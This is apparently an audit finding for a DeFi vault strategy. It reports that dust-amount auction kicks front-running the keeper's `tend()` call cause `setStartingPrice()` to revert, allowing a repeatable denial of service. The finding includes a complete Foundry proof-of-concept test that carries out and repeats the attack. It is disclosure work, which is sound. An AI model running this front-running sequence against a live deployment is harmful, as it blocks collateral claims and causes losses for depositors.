# Keeper DoS via front-run dust kick causing `setStartingPrice()` revert

### Summary

An attacker can front-run the keeper’s `tend()` transaction by first kicking a “dust-size” auction. Because `Strategy._tend()` blindly calls `AUCTION.setStartingPrice(…)` whenever any auction is active, the keeper’s call will revert. Repeat this every epoch and keepers never successfully tend again—collateral sits unclaimed, BOLD shrinks on liquidations, and the vault continually records losses.

### Root Cause

In the `_tend()` function there is no check for an active auction before calling `setStartingPrice()`, so any non-zero active auction causes a revert.

Meanwhile, `tendTrigger()` will return false while `AUCTION.available(COLL) > 0`, so keepers never attempt to settle or clear the auction.

### Internal Pre-conditions

None

### External Pre-conditions

- Attacker must know the collateral token and auction address (public).
- Attacker must observe the keeper’s pending `tend()` and be able to front-run it in the mempool.
- Auction must already be enabled (done in the strategy constructor).

### Attack Path

1. Enable auction (already done at deployment).
2. Wait for keeper’s `tend()` tx in the mempool.
3. Front-run by transferring a dust amount (e.g. 1 wei of COLL) to the Auction contract, then calling `IAuction.kick(COLL)`.
4. This creates an active auction with `available(COLL) > 0`.
5. The keeper’s `tend()` arrives and executes `_tend()`, reaches `setStartingPrice(...)`, and reverts due to the active auction.
6. Because `tendTrigger()` now returns false (auction still active), keepers never retry until `auctionLength` elapses—repeat to perpetuate DoS.

### Impact

Denial of Service on the time-sensitive tend() function.

No privileged access required. The vault will stop claiming collateral rewards and stop auctioning them, causing on-chain losses from liquidations.

Medium severity (impacts availability of a time-sensitive function; repeatable DoS)

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/console2.sol";
import {Setup, ERC20, IStabilityPool} from "./utils/Setup.sol";
import {IStrategyInterface} from "../interfaces/IStrategyInterface.sol";
import {IAuction} from "../interfaces/IAuction.sol";


contract AuctionFrontRunningDoSPOC is Setup {

    address public attacker = address(0x1337);

    function setUp() public virtual override {
        super.setUp();
        vm.prank(management);
        strategy.allowDeposits();

        // Setup strategy with assets
        uint256 depositAmount = 1000 ether;
        mintAndDepositIntoStrategy(strategy, user, depositAmount);
    }


    function test_AuctionFrontRunningCausesPerpetualDoS() public {
        console2.log("=== DEMONSTRATING AUCTION FRONT-RUNNING DoS ATTACK ===");

        // STEP 1: Strategy accumulates collateral gains
        address auctionContract = strategy.AUCTION();
        address collToken = strategy.COLL();
        uint256 collateralGain = 5 ether;

        airdrop(ERC20(collToken), address(strategy), collateralGain);

        console2.log("STEP 1: Strategy has collateral gains");
        console2.log("Collateral on strategy:", ERC20(collToken).balanceOf(address(strategy)));

        // STEP 2: Verify tendTrigger is active (keeper would see this)
        (bool triggerBefore,) = strategy.tendTrigger();
        assertTrue(triggerBefore, "Tend should be triggered");
        console2.log("STEP 2: tendTrigger() active:", triggerBefore);
        console2.log("Keeper would submit tend() transaction");

        // STEP 3: Attacker front-runs by creating dust auction
        console2.log("STEP 3: Attacker front-runs with dust auction");

        uint256 dustAmount = 1; // 1 wei of COLL
        airdrop(ERC20(collToken), attacker, dustAmount);

        vm.startPrank(attacker);
        ERC20(collToken).transfer(auctionContract, dustAmount);
        IAuction(auctionContract).kick(collToken);
        vm.stopPrank();

        console2.log("Attacker created dust auction with:", dustAmount);
        console2.log("Amount in wei");
        console2.log("Auction available COLL:", IAuction(auctionContract).available(collToken));
        assertTrue(IAuction(auctionContract).isActive(collToken), "Auction should be active");

        // STEP 4: Keeper's tend() arrives and REVERTS due to active auction
        console2.log("STEP 4: Keeper's tend() reverts due to active auction");

        vm.prank(keeper);
        vm.expectRevert(); // setStartingPrice() will revert on active auction
        strategy.tend();

        console2.log("Keeper's tend() REVERTED as expected");

        // STEP 5: Verify tendTrigger now returns false (keepers won't retry)
        (bool triggerAfter,) = strategy.tendTrigger();
        assertFalse(triggerAfter, "tendTrigger should be false due to active auction");
        console2.log("STEP 5: tendTrigger() after attack:", triggerAfter);
        console2.log("Keepers will not retry tend() while auction is active");

        // STEP 6: Demonstrate collateral remains unclaimed
        uint256 unclaimedCollateral = ERC20(collToken).balanceOf(address(strategy));
        console2.log("STEP 6: Collateral remains unclaimed:", unclaimedCollateral);
        assertGt(unclaimedCollateral, 0, "Collateral should remain unclaimed");

        // STEP 7: Simulate attack repetition for perpetual DoS
        console2.log("STEP 7: Demonstrating perpetual DoS capability");

        // Wait for auction to potentially expire and repeat attack
        vm.warp(block.timestamp + 1 days); // Simulate time passing

        // Add more collateral gains
        airdrop(ERC20(collToken), address(strategy), 3 ether);
        console2.log("More collateral gains added: 3 ether");

        // Check if tendTrigger would become active again
        (bool triggerAfterTime,) = strategy.tendTrigger();
        console2.log("tendTrigger after time:", triggerAfterTime);

        if (triggerAfterTime) {
            console2.log("Attacker can repeat the attack...");

            // Repeat the front-running attack
            vm.startPrank(attacker);
            airdrop(ERC20(collToken), attacker, dustAmount);
            ERC20(collToken).transfer(auctionContract, dustAmount);

            // Try to kick again (might revert if auction still active)
            try IAuction(auctionContract).kick(collToken) {
                console2.log("Repeated attack successful");
            } catch {
                console2.log("Auction still active from previous attack");
            }
            vm.stopPrank();

            // Verify keeper's tend() still reverts
            vm.prank(keeper);
            vm.expectRevert();
            strategy.tend();

            console2.log("Keeper's tend() still reverts - DoS continues");
        }

        // STEP 8: Show economic impact
        console2.log("STEP 8: Economic impact analysis");

        uint256 totalUnclaimedCollateral = ERC20(collToken).balanceOf(address(strategy));
        console2.log("Total unclaimed collateral:", totalUnclaimedCollateral);
        console2.log("Attack cost: ~1 wei COLL per front-run (~$0.000000000000000001)");
        console2.log("Impact: Prevents claiming of valuable collateral worth thousands");

        // STEP 9: Demonstrate strategy reports losses
        console2.log("STEP 9: Strategy reports losses due to unclaimed collateral");

        uint256 estimatedAssets = strategy.estimatedTotalAssets();
        console2.log("Estimated total assets:", estimatedAssets);
        console2.log("Missing collateral value not counted in estimatedTotalAssets");

        console2.log("");
        console2.log("BUG CONFIRMED: Front-running with dust auctions causes perpetual DoS");
        console2.log("IMPACT: setStartingPrice() reverts on active auctions");
        console2.log("RESULT: Keepers cannot tend(), collateral remains unclaimed");
    }
}
